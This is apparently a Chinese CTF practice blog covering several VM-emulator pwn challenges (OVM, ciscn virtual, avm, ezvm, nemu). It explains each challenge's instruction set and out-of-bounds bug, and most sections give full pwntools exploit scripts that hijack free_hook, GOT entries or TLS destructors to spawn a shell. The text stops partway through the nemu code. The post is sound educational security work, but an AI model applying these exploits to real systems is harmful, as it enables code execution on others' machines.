+++
date = '2025-10-23T23:27:58+08:00'
draft = false
title = 'VMpwn练习'
categories = ["pwn"]

+++



<!--more-->



## [OGeek2019 Final]OVM

buuctf的一道题

docker pull roderickchan/debug_pwn_env:16.04-2.23-0ubuntu11.3-20240412

先输入`pc`、`sp`、`code size`

- pc：将指令写入memory的偏移，置0就行
- sp：push、pop指令写入栈的偏移，置0就行
- code size：增加一条opcode，opcode size就要加1



vm指令：

- 0x10：mov reg[high]，low
- 0x20：mov reg[high]，0
- 0x30：mov reg[high]，memory[reg[low]]
- 0x40：mov memory[reg[low]]，reg[high]
- 0x50：PUSH：push reg[high] ，sp++
- 0x60：POP： pop[high]，sp--
- 0x70：ADD： reg[high] = reg[low] + reg[medium]
- 0x80：SUB：reg[high] = reg[medium] - reg[low]
- 0x90：AND： reg[high] = reg[low] & reg[medium]
- 0xa0：OR：reg[high] = reg[low] | reg[medium]
- 0xb0：XOR：reg[high] = reg[low] ^ reg[medium]
- 0xc0：SHL：reg[high] = reg[medium] << reg[low]
- 0xd0：SHR：reg[high] = reg[medium] >> reg[low]
- 0xe0：EXIT：停止执行

### 思路

可以往memory[]中写入负数偏移，指向got表中的stderr_ptr，再根据偏移找到free_hook，让comment指向free_hook-0x8,往free_hook-0x8开始的数据写入`b'/bin/sh\x00'+p64(sys_addr)`,这样free(comment)，就是system("/bin/sh")



### exp

（拿了别的师傅的exp）

```
from pwn import *
context.terminal = ["tmux", "splitw", "-h"]
context(os='linux',arch='amd64',log_level='debug')

address = './pwn'
# address = './pwn_patched'
elf = ELF(address)
libc = elf.libc

#-----------------------------------------------------------------
s       = lambda data               :p.send(data)
ss      = lambda data               :p.send(str(data))
sa      = lambda delim,data         :p.sendafter(str(delim), data)
sl      = lambda data               :p.sendline(data)
sls     = lambda data               :p.sendline(str(data))
sla     = lambda delim,data         :p.sendlineafter(delim, data)
r       = lambda num                :p.recv(num)
ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
itr     = lambda                    :p.interactive()
uu32    = lambda data               :u32(data.ljust(4,b'\x00'))
uu64    = lambda data               :u64(data.ljust(8,b'\x00'))
# lg      = lambda s,addr		        : log.info('\033[1;31;40m %s --> 0x%x \033[0m' % (s,addr))
lg      = lambda s			        : log.info('\033[1;31;40m %s --> 0x%x \033[0m' % (s, eval(s)))
l64     = lambda                    :u64(p.recvuntil("\x7f")[-6:].ljust(8,b"\x00"))
l32     = lambda                    :u32(p.recvuntil("\xf7")[-4:].ljust(4,b"\x00"))
r64     = lambda                    :u64(p.recv(6).ljust(8,b'\x00'))
ir64    = lambda                    :int(p.recv(14),16)
#-----------------------------------------------------------------
gdbscript = \
"""
    sbase 0x202060
    sbase 0x202460
    c
"""
if len(sys.argv) > 1 and sys.argv[1] == "r":
    p = remote("node5.buuoj.cn",29198 )
elif len(sys.argv) > 1 and sys.argv[1] == "d":
    p = gdb.debug(address, gdbscript = gdbscript)
else:
    p = process(address)

def dbg():
    gdb.attach(p)
    # gdb.attach(p, gdbscript=gdbscript)
    # pause()


#def opcode(op,high,medium,low):
#    pl = (op << 24) + (high << 16) + (medium << 8) + (low)
#    print("--->",hex(pl))
#    sl(str(pl))


#sla(b"PC: ",str(0))
#sla(b"SP: ",str(1))
#sla(b"CODE SIZE: ",str(4))
#ru(b"CODE: ")

##create a stderr address in reg array
#opcode(0x10,0,0,26)     #mov reg[0],26
#opcode(0x80,2,1,0)      #reg[2]=reg[1]-reg[0]
#opcode(0x30,4,0,2)      #mov reg[4],memory[reg[2]]

class VM:
    def __init__(self):
        self.instructions = []
    
    def opcode(self, op, high, medium, low):
        self.instructions.append((op << 24) | (high << 16) | (medium << 8) | low)
    
    def send_all(self):
        sla(b"PC: ", "0")
        sla(b"SP: ", "0")
        sla(b"CODE SIZE: ", str(len(self.instructions)))
        ru(b"CODE: ")
        for instr in self.instructions:
            sl(str(instr))

# - 0x10：mov reg[high]，low
# - 0x20：mov reg[high]，0
# - 0x30：mov reg[high]，memory[reg[low]]
# - 0x40：mov memory[reg[low]]，reg[high]
# - 0x50：PUSH：push reg[high] ，sp++
# - 0x60：POP： pop[high]，sp--
# - 0x70：ADD： reg[high] = reg[low] + reg[medium]
# - 0x80：SUB：reg[high] = reg[medium] - reg[low]
# - 0x90：AND： reg[high] = reg[low] & reg[medium]
# - 0xa0：OR：reg[high] = reg[low] | reg[medium]
# - 0xb0：XOR：reg[high] = reg[low] ^ reg[medium]
# - 0xc0：SHL：reg[high] = reg[medium] << reg[low]
# - 0xd0：SHR：reg[high] = reg[medium] >> reg[low]
# - 0xe0：EXIT：停止执行

# 使用示例
vm = VM()
#create a stderr address in reg array
#负数偏移指向stderr
vm.opcode(0x10, 0, 0, 26)   #mov reg[0], 26 
vm.opcode(0x80, 2, 1, 0)    #reg[2] = reg[1]-reg[0] = FFFFFFE6
vm.opcode(0x30, 4, 0, 2)    #mov reg[4],memory[reg[2]]
vm.opcode(0x10,0,0,25)     #mov reg[0],25
vm.opcode(0x80,2,1,0)      #reg[2]=reg[1]-reg[0]
vm.opcode(0x30,5,0,2)      #mov reg[5],memory[reg[2]]  reg[4][5]--->stderr address

# create free_hook address through stderr address
# stderr + 0x10a0 = free_hook - 0x8
vm.opcode(0x10,2,0,0x10)     #mov reg[2],0x10
vm.opcode(0x10,0,0,8)      #mov reg[0],8
vm.opcode(0xc0,1,2,0)      #reg[1]=sal reg[2],8

vm.opcode(0x10,2,0,0xa0)   #mov reg[2],0xa0
vm.opcode(0x70,1,1,2)      #add reg[1],reg[2]
vm.opcode(0x70,4,4,1)      #add reg[4],reg[1]    reg[4][5]--->free_hook address-8

# let pointer comment point to free_hook
vm.opcode(0x10,0,0,0x8)     #mov reg[0],8
vm.opcode(0x80,2,7,0)      #reg[2]=reg[7]-reg[0] = FFFFFFF8
vm.opcode(0x40,4,0,2)      #mov memory[reg[2]],reg[4]
vm.opcode(0x10,0,0,0x7)     #mov reg[0],9
vm.opcode(0x80,2,7,0)      #reg[2]=reg[7]-reg[0]
vm.opcode(0x40,5,0,2)      #mov memory[reg[2]],reg[5]
vm.send_all()

p.recvuntil("R4: ")
addr1=int(p.recv(8),16)
p.recvuntil("R5: ")
addr2=int(p.recv(4),16)
sys_addr=addr1+((addr2)<<32)-0x381410
lg("sys_addr")
# dbg()
p.sendafter("HOW DO YOU FEEL AT OVM?\n",b'/bin/sh\x00'+p64(sys_addr))


itr()
```





## ciscn_2019_qual_virtual

先分配几个堆块

```c
  s = malloc(0x20u);                            // name
  data = alloc(0x40);
  text = alloc(0x80);
  stack = alloc(0x40);
  ptr = malloc(0x400u);
```

输入数据，将指令转成opcode，数据写入data

```c
  puts("Your program name:");
  input(s, 32);
  puts("Your instruction:");
  input(ptr, 0x400);
  get_opcode_numnber(text, ptr);
  puts("Your stack data:");
  input(ptr, 0x400);
  get_data(data, ptr);
```

交互方式大致为：

```py
sla(b'name:\n',b'j4f')
sla(b'instruction:\n',b'push push push add pop')
sla(b'stack data:\n',b'2 4 6')
```



指令：

```
push: push数据，后push的在伪造stack的高地址
pop：stack高地址的数据，给data的低地址
add: stack两个高地址的数据相加，存在stack次高地址处
sub：stack两个高地址的数据相减(高地址减次高地址)，存在stack次高地址处
mul: stack两个高地址的数据相乘，存在stack次高地址处
div: stack两个高地址的数据相除，存在stack次高地址处
load: 往stack_data + flag + 偏移处，写入基于stack_data某偏移内容
```

load指令：

存数据到栈顶

```c
// load
__int64 __fastcall sub_401CCE(alloc_heap *stack, __int64 data)
{
  __int64 v3; // [rsp+10h] [rbp-10h] BYREF

  if ( (unsigned int)give_v1_2_v2(stack, &v3) ) //这里会把flag-1
    return give_v2_2_V1(stack, *((_QWORD *)stack->data_ptr + stack->flag + v3)); //这里flag+1
  else
    return 0;
}
```

把`*((_QWORD *)stack->data_ptr + stack->flag + v3))`的值给栈顶

注意flag - 1 

save指令：

写数据到`*((_QWORD *)stack->data_ptr + stack->flag + v3)`中

```c
// save
__int64 __fastcall sub_401D37(alloc_heap *stack, __int64 data)
{
  __int64 v3; // [rsp+10h] [rbp-10h] BYREF
  __int64 v4; // [rsp+18h] [rbp-8h] BYREF

  if ( !(unsigned int)give_v1_2_v2(stack, &v3) || !(unsigned int)give_v1_2_v2(stack, &v4) ) //注意这里会把flag -2 
    return 0;
  *((_QWORD *)stack->data_ptr + stack->flag + v3) = v4;
  return 1;
}
```

先push的是v4

注意flag -2

execute完之后，会`puts(s);`，这里把puts_got改成system，s写入/bin/sh

### exp

```py
from pwn import *
context.terminal = ["tmux", "splitw", "-h"]
context(os='linux',arch='amd64',log_level='debug')

address = './pwn'
# address = './pwn_patched'
elf = ELF(address)
libc = elf.libc

#-----------------------------------------------------------------
s       = lambda data               :p.send(data)
ss      = lambda data               :p.send(str(data))
sa      = lambda delim,data         :p.sendafter(str(delim), data)
sl      = lambda data               :p.sendline(data)
sls     = lambda data               :p.sendline(str(data))
sla     = lambda delim,data         :p.sendlineafter(delim, data)
r       = lambda num                :p.recv(num)
ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
itr     = lambda                    :p.interactive()
uu32    = lambda data               :u32(data.ljust(4,b'\x00'))
uu64    = lambda data               :u64(data.ljust(8,b'\x00'))
# lg      = lambda s,addr		        : log.info('\033[1;31;40m %s --> 0x%x \033[0m' % (s,addr))
lg      = lambda s			        : log.info('\033[1;31;40m %s --> 0x%x \033[0m' % (s, eval(s)))
l64     = lambda                    :u64(p.recvuntil("\x7f")[-6:].ljust(8,b"\x00"))
l32     = lambda                    :u32(p.recvuntil("\xf7")[-4:].ljust(4,b"\x00"))
r64     = lambda                    :u64(p.recv(6).ljust(8,b'\x00'))
ir64    = lambda                    :int(p.recv(14),16)
#-----------------------------------------------------------------
gdbscript = \
"""
    b *0x401332
    c
"""
if len(sys.argv) > 1 and sys.argv[1] == "r":
    p = remote("node5.buuoj.cn",29332 )
elif len(sys.argv) > 1 and sys.argv[1] == "d":
    p = gdb.debug(address, gdbscript = gdbscript)
else:
    p = process(address)

def dbg():
    # gdb.attach(p)
    gdb.attach(p, gdbscript=gdbscript)
    # pause()

# data 0x200
# text  0x400
# stack 0x200
# instruction 0x400

p.sendlineafter("Your program name:\n","/bin/sh\x00")
p.sendlineafter("Your instruction:\n","push push save push load push add push save")
p.sendlineafter("Your stack data:\n","4210896 -3 -21 -172800 -21")


itr()
```



## 长城杯pwn---avm

文章及附件：https://bbs.kanxue.com/thread-284826.htm

这里我直接拿我本地的libc做了

vm结构体

```c
struct vm_struct
{
  _QWORD reg[32];
  _QWORD rip;
  _QWORD opcode;
  _QWORD num;
};
```

交互：

一条指令32个bit，最高4个bit作为instruction，0-4、5-9、16-20作为low,medium,high

```py
def op(opcode,high,medium,low):
    ope = p32(opcode<<28 | (high&0x1f)<<16 | (medium&0x1f)<<5 | (low&0x1f))
    return ope

def add(high,medium,low):
    ret op(1,high,medium,low)

def load(offset,medium,src,opcode=9):
    ope = p32(opcode<<28 | (offset&0xfff)<<16 | (medium&0x1f)<<5 | (src&0x1f))
    return ope

def store(offset,medium,dest,opcode=10):
    ope = p32(opcode<<28 | (offset&0xfff)<<16 | (medium&0x1f)<<5 | (dest&0x1f))
    return ope
```

指令:

4个字节一个指令

```
add: low = high + medium
sub: low = medium - high
mul: low = high*medium
div: low = medium/high
xor: low = high^medium
and: low = high&medium
shl: low = medium<<high
shr: low = medium>>high
```

load：把low寄存器中的内容，写到某栈地址+medium寄存器内容+偏移处

这里low和medium不要是同一寄存器

```c
unsigned __int64 __fastcall load(vm_struct *vm_struct, __int64 stack)
{
  unsigned __int64 result; // rax
  unsigned int v3; // [rsp+20h] [rbp-20h]
  _QWORD *v4; // [rsp+30h] [rbp-10h]

  v3 = *(_DWORD *)(vm_struct->opcode + (vm_struct->rip & 0xFFFFFFFFFFFFFFFCLL));
  vm_struct->rip += 4LL;
  result = (unsigned __int8)byte_4010;          // 0xff
  if ( (unsigned __int8)(vm_struct->reg[(v3 >> 5) & 0x1F] + BYTE2(v3)) < (unsigned __int8)byte_4010 )
  {
    v4 = (_QWORD *)((unsigned __int16)(vm_struct->reg[(v3 >> 5) & 0x1F] + (HIWORD(v3) & 0xFFF)) + stack);
    *v4 = vm_struct->reg[v3 & 0x1F];
    return (unsigned __int64)v4;
  }
  return result;
}
```

store：把某栈地址+medium寄存器内容+偏移处的8字节，给low寄存器

```c
vm_struct *__fastcall mov(vm_struct *vm_struct, __int64 a2)
{
  vm_struct *vm_struct_1; // rax
  unsigned __int16 v3; // [rsp+1Eh] [rbp-22h]
  unsigned int v4; // [rsp+20h] [rbp-20h]

  v4 = *(_DWORD *)(vm_struct->opcode + (vm_struct->rip & 0xFFFFFFFFFFFFFFFCLL));
  vm_struct->rip += 4LL;
  vm_struct_1 = (vm_struct *)(unsigned __int8)byte_4010;
  if ( (unsigned __int8)(vm_struct->reg[(v4 >> 5) & 0x1F] + BYTE2(v4)) < (unsigned __int8)byte_4010 )// 0xff
  {
    vm_struct_1 = vm_struct;
    v3 = vm_struct->reg[(v4 >> 5) & 0x1F] + (HIWORD(v4) & 0xFFF);
    vm_struct->reg[v4 & 0x1F] = ((unsigned __int64)*(unsigned __int8 *)(v3 + a2 + 7) << 56)
                              | ((unsigned __int64)*(unsigned __int8 *)(v3 + a2 + 6) << 48)
                              | ((unsigned __int64)*(unsigned __int8 *)(v3 + a2 + 5) << 40)
                              | ((unsigned __int64)*(unsigned __int8 *)(v3 + a2 + 4) << 32)
                              | ((unsigned __int64)*(unsigned __int8 *)(v3 + a2 + 3) << 24)
                              | ((unsigned __int64)*(unsigned __int8 *)(v3 + a2 + 2) << 16)
                              | *(unsigned __int16 *)(v3 + a2);
  }
  return vm_struct_1;
}
```



### 思路

- 把栈上的libc地址存在vm_struct的寄存器中
- 因为我们的opcode是存在栈上的，所以在opcode的末尾可以加上我们自己的东西
- 把寄存器的libc地址，加减我们写入opcode末尾的偏移，构造rop链
- 把rop链写入栈中返回地址处



### exp

```py
from pwn import *
context.terminal = ["tmux", "splitw", "-h"]
context(os='linux',arch='amd64',log_level='debug')

address = './pwn1'
# address = './pwn_patched'
elf = ELF(address)
libc = elf.libc

#-----------------------------------------------------------------
s       = lambda data               :p.send(data)
ss      = lambda data               :p.send(str(data))
sa      = lambda delim,data         :p.sendafter(str(delim), data)
sl      = lambda data               :p.sendline(data)
sls     = lambda data               :p.sendline(str(data))
sla     = lambda delim,data         :p.sendlineafter(delim, data)
r       = lambda num                :p.recv(num)
ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
itr     = lambda                    :p.interactive()
uu32    = lambda data               :u32(data.ljust(4,b'\x00'))
uu64    = lambda data               :u64(data.ljust(8,b'\x00'))
# lg      = lambda s,addr		        : log.info('\033[1;31;40m %s --> 0x%x \033[0m' % (s,addr))
lg      = lambda s			        : log.info('\033[1;31;40m %s --> 0x%x \033[0m' % (s, eval(s)))
l64     = lambda                    :u64(p.recvuntil("\x7f")[-6:].ljust(8,b"\x00"))
l32     = lambda                    :u32(p.recvuntil("\xf7")[-4:].ljust(4,b"\x00"))
r64     = lambda                    :u64(p.recv(6).ljust(8,b'\x00'))
ir64    = lambda                    :int(p.recv(14),16)
#-----------------------------------------------------------------
gdbscript = \
"""
    # bbase 0x1b70
    # bbase 0x1AFB #Unsupported instruction的leave;ret
    bbase 0x1aad
    c
"""
if len(sys.argv) > 1 and sys.argv[1] == "r":
    p = remote("host.docker.internal",9999 )
elif len(sys.argv) > 1 and sys.argv[1] == "d":
    p = gdb.debug(address, gdbscript = gdbscript)
else:
    p = process(address)

def dbg():
    # gdb.attach(p)
    gdb.attach(p, gdbscript=gdbscript)
    # pause()

def op(opcode,high,medium,low):
    ope = p32(opcode<<28 | (high&0x1f)<<16 | (medium&0x1f)<<5 | (low&0x1f))
    return ope

def add(high,medium,low):
    return op(1,high,medium,low)

def sub(high,medium,low):
    return op(2,high,medium,low)

def load(offset,medium,src,opcode=9):
    ope = p32(opcode<<28 | (offset&0xfff)<<16 | (medium&0x1f)<<5 | (src&0x1f))
    return ope

def store(offset,medium,dest,opcode=10):
    ope = p32(opcode<<28 | (offset&0xfff)<<16 | (medium&0x1f)<<5 | (dest&0x1f))
    return ope

base_addr = 0x120+0x38
dest_offset = 0x118
#dest:
# 04:0020│ rdx rsi 0x7ffe2b9fa530 —▸ 0x7955af50f78b (__spawnix+875) ◂— pop rdi
#ret_addr:
# 27:0138│+008 0x7ffe2b9fa648 —▸ 0x5ac76e63fb9d ◂— nop
opcode = store(0xd38,0,0) #libc地址给寄存器0
opcode+= store(base_addr,20,1) #system的偏移给寄存器1，20这里随便设置，不和low一样就行
opcode+= store(base_addr+8,20,2) #binsh的偏移给寄存器2
opcode+= store(base_addr+0x10,20,3) #ret的偏移给寄存器3
opcode+= store(base_addr+0x18,20,4) #pop_rdi_ret偏移给寄存器4
opcode+= add(0,1,5) #寄存器5=寄存器0+system偏移=system地址
opcode+= add(0,2,6) #寄存器6=寄存器0+binsh偏移=binsh地址
opcode+= sub(3,0,7) #寄存器7=寄存器0-ret偏移=ret地址
opcode+= add(0,4,8) #寄存器8=寄存器0+pop_rdi_ret偏移=pop_rdi_ret地址

opcode+= load(dest_offset,20,8) #pop_rdi_ret
opcode+= load(dest_offset+8,20,6) #binsh
opcode+= load(dest_offset+0x10,20,7) #ret
opcode+= load(dest_offset+0x18,20,5) #system

opcode+=p32(0)
opcode+=p64(0x2e586) #system
opcode+=p64(0x1a1265) #binsh
opcode+=p64(0x199b) #ret
opcode+=p64(0xe55c1) #pop_rdi_ret

# dbg()
sla(b'opcode: ',opcode)

itr()
# sbase 0x40c0

# 0x7fff2d02dd50 #main栈帧中存储opcode地址
# 0x7fff2d02dc30 #execute 中stack地址
#之间偏移为0x120

#system = 寄存器0 + 0x2e586
#binsh = 寄存器0 + 0x1a1265
#ret = 寄存器0 - 0x199b
#pop_rdi_ret = 寄存器0 + 0xe55c1



# pwndbg> sbase 0x40c0
# 00:0000│ rax rdi 0x6127080540c0 —▸ 0x759f7fe2a1ca (__libc_start_call_main+122) ◂— mov edi, eax
# 01:0008│         0x6127080540c8 ◂— 0
# 02:0010│         0x6127080540d0 ◂— 0
# 03:0018│         0x6127080540d8 ◂— 0
# 04:0020│         0x6127080540e0 ◂— 0
# 05:0028│         0x6127080540e8 ◂— 0
# 06:0030│         0x6127080540f0 ◂— 0
# 07:0038│         0x6127080540f8 ◂— 0
# 08:0040│         0x612708054100 ◂— 0
# 09:0048│         0x612708054108 ◂— 0
# pwndbg> p &system
# $1 = (int (*)(const char *)) 0x759f7fe58750 <__libc_system>
# pwndbg> search "/bin/sh"                                                       
# Searching for byte: b'/bin/sh'
# libc.so.6       0x759f7ffcb42f 0x68732f6e69622f /* '/bin/sh' */
# pwndbg> p/x 0x759f7fe58750 - 0x759f7fe2a1ca
# $2 = 0x2e586
# pwndbg> p/x 0x759f7ffcb42f - 0x759f7fe2a1ca
# $3 = 0x1a1265

#ret指令
# 0x000000000002882f : ret 
# pwndbg> p/x 0x759f7fe2a1ca - 0x759f7fe2882f
# $6 = 0x199b
# 寄存器1 - binsh地址 = 0x199b

#pop_rdi_ret
# 0x000000000010f78b : pop rdi ; ret
# pwndbg> p/x  0x759f7ff0f78b - 0x759f7fe2a1ca
# $8 = 0xe55c1
# pop_rdi_ret - 寄存器0 = 0xe55c1
```



## 2020网鼎杯青龙组-boom1

https://xz.aliyun.com/news/7382?u_atoken=0095c38b74859b438aaf681829ace4ba&u_asig=1a0c381017440330108046584e0135

编译器类vmpwn

大概看了看，程序很大，实现了一个编译器，执行我们输入的C代码。

`malloc(0x40000u);`会走mmap，申请的变量和libc的偏移是固定的

> 我们可以定义一个变量，从这个变量的地址寻址到`__free_hook`和`system`函数，将后者覆写到前者，再调用`free('/bin/sh')`即可。



## 0CTF/TCTF 2022 ezvm

别的师傅WP：https://github.com/nobodyisnobody/write-ups/tree/main/0CTF.TCTF.2022/pwn/ezvm

指令梳理：

```
0 push: 把memory的数据压入栈中
1 pop: 栈中数据弹出到memory
2-12 ： 对栈中数据进行加减乘除等操作，并把sp-1
13 : 判断栈顶是否为0
14-16： jmp jz jnz 
17-19: 比较指令
20 mov: 写8字节到bss段（类似寄存器）
21 store:指定寄存器中数据写入到memory区域
22 load:把memory中的数据写入到指定寄存器
```

交互：

```py
push    =   lambda bss              :p8(0)+p8(bss) #压入寄存器的内容到栈
and_f   =   lambda                  :p8(9)
nz      =   lambda add_ip           :p8(15)+p64(add_ip)
jnz     =   lambda add_ip           :p8(16)+p64(add_ip)
mov     =   lambda bss,imm          :p8(0x14)+p8(bss)+p64(imm) #imm->寄存器
store   =   lambda bss,memory       :p8(0x15)+p8(bss)+p64(memory) #寄存器->memory 
load    =   lambda bss,memory       :p8(0x16)+p8(bss)+p64(memory) #mrmory->寄存器             
exit_f  =   lambda                  :p8(0x17)
```



关键点在于这个malloc会把size左移3个bit，传入`0x2000000000030000`就能越界写

```asm
.text:0000000000002353                 mov     rax, [rbp+size_1]
.text:0000000000002357                 shl     rax, 3
.text:000000000000235B                 mov     [rbp+var_10], rax
.text:000000000000235F                 mov     rax, [rbp+var_10]
.text:0000000000002363                 mov     rdi, rax        ; size
.text:0000000000002366                 call    _malloc
```



思路：

- free一个堆块进unsorted bin，memory 区域会留下libc
- 爆破出libc
- 利用`__call_tls_dtors`来getshell



### exp

不知道为什么最后`bye bye`的时候退不出去。。

```py
from pwn import *
context.terminal = ["tmux", "splitw", "-h","-p","65","-b"]
context(os='linux',arch='amd64',log_level='debug')

address = './pwn'
# address = './pwn_patched'
elf = ELF(address)
libc = elf.libc

#-----------------------------------------------------------------
s       = lambda data               :p.send(data)
ss      = lambda data               :p.send(str(data))
sa      = lambda delim,data         :p.sendafter(delim, data)
sl      = lambda data               :p.sendline(data)
sls     = lambda data               :p.sendline(str(data))
sla     = lambda delim,data         :p.sendlineafter(delim, data)
r       = lambda num                :p.recv(num)
ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
itr     = lambda                    :p.interactive()
uu32    = lambda data               :u32(data.ljust(4,b'\x00'))
uu64    = lambda data               :u64(data.ljust(8,b'\x00'))
# lg      = lambda s,addr		        : log.info('\033[1;31;40m %s --> 0x%x \033[0m' % (s,addr))
lg      = lambda s			        : log.info('\033[1;31;40m %s --> 0x%x \033[0m' % (s, eval(s)))
l64     = lambda                    :u64(p.recvuntil("\x7f")[-6:].ljust(8,b"\x00"))
l32     = lambda                    :u32(p.recvuntil("\xf7")[-4:].ljust(4,b"\x00"))
r64     = lambda                    :u64(p.recv(6).ljust(8,b'\x00'))
ir64    = lambda                    :int(p.recv(14),16)
#-----------------------------------------------------------------
gdbscript = \
"""
    # bbase 0x23BF #call execute
    # bbase 0x2353 #malloc
    # bbase 0x228E #out malloc
    bbase 0x14e2 #free
    # bbase 0x1a0d #shr
    # bbase 0x1582 #switch
    # bbase 0x246F #exit
    c
"""
if len(sys.argv) > 1 and sys.argv[1] == "r":
    p = remote("host.docker.internal",9999 )
elif len(sys.argv) > 1 and sys.argv[1] == "d":
    p = gdb.debug(address, gdbscript = gdbscript)
else:
    p = process(address)

def dbg():
    gdb.attach(p)
    # gdb.attach(p, gdbscript=gdbscript)
    # pause()

push    =   lambda bss              :p8(0)+p8(bss) #压入寄存器的内容到栈
and_f   =   lambda                  :p8(9)
nz      =   lambda add_ip           :p8(15)+p64(add_ip)
jnz     =   lambda add_ip           :p8(16)+p64(add_ip)
mov     =   lambda bss,imm          :p8(0x14)+p8(bss)+p64(imm) #imm->寄存器
store   =   lambda bss,memory       :p8(0x15)+p8(bss)+p64(memory) #寄存器->memory 
load    =   lambda bss,memory       :p8(0x16)+p8(bss)+p64(memory) #mrmory->寄存器             
exit_f  =   lambda                  :p8(0x17)

#让memory为main_arena地址
sla(b'0ctf2022!!\n',b'aaaa')
opcode = exit_f()
sla(b'code size:\n',str(len(opcode)))
sla(b'memory count:\n',str(0x410>>3))
sla(b'input your code:\n',opcode)

# sla(b'continue?\n',b'c')

#爆破获取libc
libc_base = 0x700000000000
for i in range(4,45,1):
    print('leaking bit '+str(i))
    opcode = mov(0,1<<i)        #bitmask存入r0
    opcode+= push(0)            #bitmask 压栈
    opcode+= load(1,0)          #main_arena地址存入r1
    opcode+= push(1)            #r1压栈
    opcode+= and_f()            #bit_mask 和 main_arena 与运算
    opcode+= jnz(1)             #该bit为0就exit
    opcode+= b'\x18' + exit_f()

    sla(b'code size:\n',str(len(opcode)))
    sla(b'memory count:\n',str(0x410>>3))
    sla(b'input your code:\n',opcode)

    buffer = ru(b'finish!\n',drop=True)
    if b'what' in buffer:
        libc_base |= 1<<i
    
libc_base -= 0x219ce0
libc.address = libc_base
lg("libc_base")

def rol(value):
    return (value << 0x11) | (value >> (64 - 0x11)) & 0xffffffffffffffff
dest = rol(libc.sym['system'])

#$fs_base + 0x30（randnumber） 置0 
#0x181760 fs_base+0x30
opcode = store(0,0x302ec) # clear rand val
opcode+= mov(0,libc_base - 0x2a00)
#0x1816d8 $fs_base - 88
opcode+= store(0,0x302db) # rbp val
opcode+= mov(0,dest)
#0x1815f0  $fs_base - 0x140
opcode+= store(0,0x302be) # rbp val 
opcode+= mov(0,next(libc.search(b'/bin/sh')))
#0x1815f8  $fs_base - 0x138
opcode+= store(0,0x302bf) # rbp val
opcode+= exit_f()
sla(b'code size:\n',str(len(opcode)))
sla(b'memory count:\n',str(0x2000000000030000))
sl(opcode)
dbg()
sla(b'continue?', b"bye bye\x00")


itr()
# p/x $fs_base

# opcode_ptr memory_ptr stack_ptr opcodesize mesize
# sbase 0x5040

#stack sp
#sbase 0x5090

# dq 0x181760 + memory_ptr
```





## TQLCTF2022_nemu

> 别的师傅评价：一个完全无限制的越界读写问题。但是看似简单，读写操作的时候还需要经过一些检查。很值得一做。很适合作为VM pwn的入门题目仔细分析(正好也有源码，漏洞很经典)



这题主要考点：`理解⼀个模拟器及调试器的整体架构`，给了源码

交互：

```
help:查看所有指令description
si:单步执行1次
si 2:单步执行2次
c:一直执行
info r:查看寄存器
info w:查看断点
x 0x100005 :查看内容
x 4 0x100000：查看4个dword内容
w *0x100000：设置watch point
d 1:删除第一个watch point
set <地址> <数据>：修改数据
```

这里比较重要的就是`guest_to_host`这个宏

```c
uint32_t vaddr_read(vaddr_t addr, int len) {
  return paddr_read(addr, len);
}

uint32_t paddr_read(paddr_t addr, int len) {
  return pmem_rw(addr, uint32_t) & (~0u >> ((4 - len) << 3));
}


#define pmem_rw(addr, type) *(type *)({\
    guest_to_host(addr); \
    })

/* convert the guest physical address in the guest program to host virtual address in NEMU */
#define guest_to_host(p) ((void *)(pmem + (unsigned)p))
```

这个宏的`p`是真实的物理地址

```
pwndbg> disass vaddr_read
Dump of assembler code for function vaddr_read:
   0x0000000000406ee0 <+0>:     mov    ecx,0x4
   0x0000000000406ee5 <+5>:     mov    edi,edi
   0x0000000000406ee7 <+7>:     mov    eax,0xffffffff
   0x0000000000406eec <+12>:    sub    ecx,esi
   0x0000000000406eee <+14>:    shl    ecx,0x3
   0x0000000000406ef1 <+17>:    shr    eax,cl
   0x0000000000406ef3 <+19>:    and    eax,DWORD PTR [rdi+0x6a3b80]
   0x0000000000406ef9 <+25>:    ret
End of assembler dump.
```

查看汇编可以看到`0x6a3b80`就是`p`

```
pwndbg> dq 0x6a3b80+0x100000
0x7a3b80 <pmem+1048576>:        0x0027b900001234b8      0x0441c76601890010
0x7a3b90 <pmem+1048592>:        0x6600000002bb0001      0x01ffffe0009984c7
0x7a3ba0 <pmem+1048608>:        0x00d600000000b800      0x0000000000000000
0x7a3bb0 <pmem+1048624>:        0x0000000000000000      0x0000000000000000

100000:   b8 34 12 00 00                        movl $0x1234,%eax
```

这里也对应上了

而这里也没有对于边界的检查，所以可以进行越界读，set可以进行越界写

这里需要通过watchpoint去泄露

watchpoint数据结构

```c
typedef struct watchpoint {
  int NO;
  struct watchpoint *next;

  /* TODO: Add more members if necessary */
 char exp[30];
 uint32_t old_val;
 uint32_t new_val;

} WP;
```

考虑结构体内存对齐，实际上的内存结构：

```c
typedef struct watchpoint {
    int NO;                     // Offset: 0x0, Size: 0x4 bytes
    struct watchpoint *next;    // Offset: 0x4, Size: 0x8 bytes

    /* TODO: Add more members if necessary */
    char exp[30];               // Offset: 0x10, Size: 0x1e bytes
    uint32_t old_val;           // Offset: 0x30, Size: 4 bytes
    uint32_t new_val;           // Offset: 0x34, Size: 4 bytes
} WP;
//总共0x38
```

list_watchpoint:

```c
void list_watchpoint(){
    WP *head2 = head;
    if(head == NULL) {
        printf("No watch pint to delete\n");
        return;
    }
    printf("NO Expr               Old Value               New Value\n");
    while(head2){
        printf("%d  %-18s %#x               %#x\n",head2->NO,head2->exp,head2->old_val,head2->new_val);
        head2 = head2->next;
    }
    return;
}
```



```
pwndbg> p &head
$7 = (WP **) 0x86a3fc8 <head>

pwndbg> x/8gx 0x60f018-0x20
0x60eff8:       0x0000000000000000      0x000000000060ee18
0x60f008:       0x00007d7a583572e0      0x00007d7a583332f0
0x60f018 <__snprintf_chk@got.plt>:      0x00007d7a58137d30      0x00007d7a580add30
0x60f028 <putchar@got[plt]>:    0x0000000000401506      0x0000000000401516
```

这里要让libc地址位于head+0x30处，就能通过old_val  new_val泄露出libc地址

```py
#pwndbg> p/x 0x86a3fc8-0x6a3b80
#$1 = 0x8000448
sl(b'set 0x8000448 0x60eff0')
# dbg()
sl(b'info w')
ru(b'New Value')
ru(b'0x')
libc_low = int(p.recv(8),16)
ru(b'0x')
libc_high = int(p.recv(4),16)
lg("libc_high")
lg("libc_low")
libc_base = (libc_high<<32) | libc_low
lg("libc_base")
```



写入system：

```c
WP *new_wp(){
    if(free_ == NULL){
        assert(0);
    }
    //unlink
    WP *temp = free_;
    free_ = free_->next;
    //insert
